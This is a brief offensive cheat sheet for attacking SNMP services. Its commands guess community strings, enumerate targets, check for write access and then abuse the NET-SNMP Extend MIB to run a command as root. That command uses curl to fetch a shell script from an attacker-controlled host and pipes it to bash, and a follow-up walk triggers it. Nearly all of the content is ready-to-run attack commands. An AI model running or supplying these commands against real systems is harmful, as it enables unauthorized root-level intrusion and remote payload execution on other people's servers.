# SNMP Enumeration + RCE (NET-SNMP Extend MIB)

```bash
onesixtyone -c <community-wordlist> <TARGET>              # find a valid community string
snmpwalk -v2c -c <community> <TARGET>                      # enumerate

# test for read-write access
snmpset -v2c -c <community> <TARGET> .1.3.6.1.2.1.1.5.0 s "test"
snmpget -v2c -c <community> <TARGET> .1.3.6.1.2.1.1.5.0

# if RW: command execution via NET-SNMP-EXTEND-MIB (runs as root on most setups)
snmpset -m +NET-SNMP-EXTEND-MIB -v2c -c <community> <TARGET> \
  'nsExtendStatus."cmd"' = createAndGo \
  'nsExtendCommand."cmd"' = /bin/bash \
  'nsExtendArgs."cmd"'    = '-c "curl http://<LHOST>/shell.sh|bash"'

snmpwalk -v2c -c <community> <TARGET> .1.3.6.1.4.1.8072.1.3.2   # triggers/reads the extend output, executes the command
```
